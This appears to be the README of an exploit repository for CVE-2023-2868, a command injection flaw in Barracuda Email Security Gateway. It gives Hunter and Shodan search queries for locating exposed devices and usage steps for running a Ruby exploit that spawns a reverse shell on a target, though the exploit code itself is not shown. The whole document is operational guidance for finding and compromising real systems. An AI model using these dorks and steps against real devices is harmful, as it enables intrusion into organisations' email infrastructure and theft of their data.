# CVE-2023-2868
![](https://img.shields.io/static/v1?label=Product&message=Barracuda%20ESG&color=blue)
![](https://img.shields.io/static/v1?label=Version&message=5.1.3.001-9.2.0.006&color=brighgreen)
![](https://img.shields.io/static/v1?label=Vulnerability&message=CVSSv3:%209.8.%20Command%20Injection&color=red)

 
- [Hunter Search Link](https://hunter.how/list?searchValue=product.name%3D%22Barracuda%20Networks%20Spam%20Firewall%20smtpd%22)

- Shodan dorks:
```
product:"Barracuda Networks Spam Firewall smtpd"
```
```
http.waf:"Barracuda (Barracuda Networks)"
```
```
html:app_common::nonetwork.title
```
- Usage

Set LHOST and RHOST variables to your listener.

```
ruby exploit.rb <TARGET_IP>
```

This will spawn a reverse shell.
